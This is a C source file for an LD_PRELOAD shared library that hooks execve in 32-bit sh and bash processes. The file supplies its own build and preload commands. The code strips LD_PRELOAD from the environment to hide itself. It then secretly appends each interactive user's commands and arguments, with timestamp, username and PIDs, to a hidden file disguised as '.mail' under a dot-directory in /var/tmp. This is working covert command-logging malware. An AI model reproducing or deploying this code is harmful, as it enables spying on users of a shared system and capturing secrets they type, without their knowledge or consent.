// gcc -std=c99 -m32 -shared -fPIC -o /var/tmp/test.so test.c -ldl
// LD_PRELOAD=/var/tmp/test.so bash

#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <libgen.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <elf.h>
#include <errno.h>
#include <stdbool.h>
#include <sys/statvfs.h>

FILE *g_log = NULL;
bool g_OK = false;
int (*g_orig_execve)(const char *, char *const *, char *const *);
char *g_username;

#define LOGPATH "/var/tmp/.xixXS244s/.mail"
#define REQUIRED_FREESPACE 2000 * 1024 * 1024 // 2GB

__attribute__((destructor)) 
void fini(void) 
{
    if (g_log != NULL)
        fclose(g_log);
}

__attribute__((constructor))
void init()
 {
    struct statvfs stat;

    unsetenv("LD_PRELOAD");
#ifdef _DEBUG        
        fprintf(stderr, "Unset LD_PRELOAD\n");
#endif            

    g_orig_execve = dlsym(RTLD_NEXT, "execve");
    if (g_orig_execve == NULL)
    {
#ifdef _DEBUG        
        fprintf(stderr, "Could not resolve dlsym\n");
#endif           
        g_OK = false;
        return;
    }
     
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/path/a.out", exe_path, sizeof(exe_path) - 1);
    if (len < 0) 
    {
#ifdef _DEBUG        
        fprintf(stderr, "Failed to read /proc/self/path/a.out: %s\n", strerror(errno));
#endif
        g_OK = false;
        return;
    }
    exe_path[len] = '\0';

    if (strstr(exe_path, "/sh") == 0 && strstr(exe_path, "/bash") == 0) 
    {
#ifdef _DEBUG        
        fprintf(stderr, "Library loaded into an unsupported process: %s\n", exe_path);
#endif
        g_OK = false;        
        return;
    }
    
    int fd = open("/proc/self/object/a.out", O_RDONLY);
    if (fd < 0) 
    {
#ifdef _DEBUG        
        fprintf(stderr, "Failed to open /proc/self/object/a.out\n");
#endif
        g_OK = false;        
        return;
    }

    Elf32_Ehdr *ehdr = (Elf32_Ehdr *)mmap(NULL, sizeof(Elf32_Ehdr), PROT_READ, MAP_PRIVATE, fd, 0);
    if (ehdr == MAP_FAILED) 
    {
#ifdef _DEBUG        
        fprintf(stderr, "Failed to map ELF header\n");
#endif        
        close(fd);
        g_OK = false;
        return;
    }

    if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) 
    {
#ifdef _DEBUG        
        fprintf(stderr, "not a 32bit process: %d\n", ehdr->e_ident[EI_CLASS]);
#endif        
        munmap((void *)ehdr, sizeof(Elf32_Ehdr));
        close(fd);
        g_OK = false;
        return;
    }

    munmap((void *)ehdr, sizeof(Elf32_Ehdr));
    close(fd);

    g_username = getenv("USER");
    if (g_username == NULL)
        g_username = "Unknown";

   if (statvfs(LOGPATH, &stat) != 0) 
   {
#ifdef _DEBUG    
        fprintf(stderr, "statvfs failed\n");
#endif
        g_OK = false;
        return;
    }

    unsigned long long avl_space = stat.f_bavail * stat.f_frsize;
#ifdef _DEBUG    
        fprintf(stderr, "Available space: %llu bytes\n", avl_space);
#endif
    if (avl_space < (long long)REQUIRED_FREESPACE)
    {
#ifdef _DEBUG    
        fprintf(stderr, "Available space less than required: %llu bytes %llu bytes\n", avl_space, (long long)REQUIRED_FREESPACE);
#endif
        g_OK = false;
        return;
    }

    g_OK = true;
}

int execve(const char *filename, char *const argv[], char *const envp[]) 
{
    time_t rawtime;
    struct tm *timeinfo;
    char t_buffer[80];

    char **env;
    for (env = (char **)envp; *env != NULL; ++env) 
    {
        if (strncmp(*env, "LD_PRELOAD=", 11) == 0) 
        {
            *env = NULL;
            break;
        }
    } 

    if (g_OK == true)
    {
        #ifdef _DEBUG        
            fprintf(stderr, "Checking PTY\n");
        #endif     

        char *tty = ttyname(STDIN_FILENO);
        if (tty != NULL && strncmp(tty, "/dev/pts/", 9) == 0) 
        {
            g_log = fopen(LOGPATH, "a");
            if (g_log)
            {
                time(&rawtime);
                timeinfo = localtime(&rawtime);
                strftime(t_buffer, sizeof(t_buffer), "%Y-%m-%d %H:%M:%S", timeinfo);

                pid_t pid = getpid();
                pid_t ppid = getppid();

                char *const *arg;
                fprintf(g_log, "[%s - %s - %d %d] %s: ", t_buffer, g_username, pid, ppid, filename);
                for (arg = argv; *arg; ++arg)
                    fprintf(g_log, "%s ", *arg);
                fprintf(g_log, "\n");
                fclose(g_log);
            }
        }
    }

    return g_orig_execve(filename, argv, envp);
}
